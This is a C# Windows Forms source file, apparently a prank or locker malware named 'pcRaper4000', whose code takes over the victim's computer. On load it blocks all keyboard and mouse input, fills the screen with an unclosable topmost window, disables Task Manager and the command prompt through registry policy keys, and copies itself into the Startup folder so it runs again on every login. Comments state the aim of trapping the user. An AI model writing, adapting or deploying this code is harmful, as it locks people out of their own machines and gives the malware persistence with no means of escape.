using Microsoft.Win32;
using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.IO;
using System.Linq;
using System.Runtime.InteropServices;
using System.Text;
using System.Threading.Tasks;
using System.Windows.Forms;

namespace pcRaper4000
{
    public partial class Form1 : Form
    {
        public Form1()
        {
            InitializeComponent();
        }
        
        [DllImport("user32.dll")]
        static extern bool BlockInput(bool fBlockIt);
        
        private void Form1_Load(object sender, EventArgs e)
        {
            //even if they crtl alt del their input will be blocked and they cant hit the windows key
            BlockInput(true);
            this.TopMost = true;
            this.FormBorderStyle = FormBorderStyle.None;
            this.WindowState = FormWindowState.Maximized;

            
            //disable task manager
            RegistryKey disabletask = Registry.CurrentUser.CreateSubKey(@"Software\Microsoft\Windows\CurrentVersion\Policies\System");
            if (disabletask.GetValue("DisableTaskMgr") == null)
                disabletask.SetValue("DisableTaskMgr", "1");
            
            else
                disabletask.DeleteValue("DisableTaskMgr");
                disabletask.Close();

            
            //disable cmd
            RegistryKey disablecmd = Registry.CurrentUser.CreateSubKey(@"Software\Policies\Microsoft\Windows\System");
            if (disablecmd.GetValue("DisableCMD") == null)
                disablecmd.SetValue("DisableCMD", "1");
            
            else
                disablecmd.DeleteValue("DisableCMD");
                disablecmd.Close();


            //copy to startup
            string thisFile = System.AppDomain.CurrentDomain.FriendlyName;

            string Path = AppDomain.CurrentDomain.BaseDirectory + "\\" + thisFile;

            string Filepath = Environment.GetFolderPath(Environment.SpecialFolder.Startup) + "\\" + thisFile;

                if (!File.Exists(Environment.GetFolderPath(Environment.SpecialFolder.Startup) + "\\" + thisFile))
                {
                    System.IO.File.Copy(Application.ExecutablePath, Filepath);
                }
        }
        
        //disable alt f4
        protected override void OnFormClosing(FormClosingEventArgs e)
        {
            switch (e.CloseReason)
            {
                
                case CloseReason.UserClosing:
                    e.Cancel = true;
 
                //even if they crtl alt del their input will be blocked and they cant hit the windows key
                BlockInput(true);
                this.TopMost = true;
                this.FormBorderStyle = FormBorderStyle.None;
                this.WindowState = FormWindowState.Maximized;
                break;
            }
            base.OnFormClosing(e);
        }

    }
}
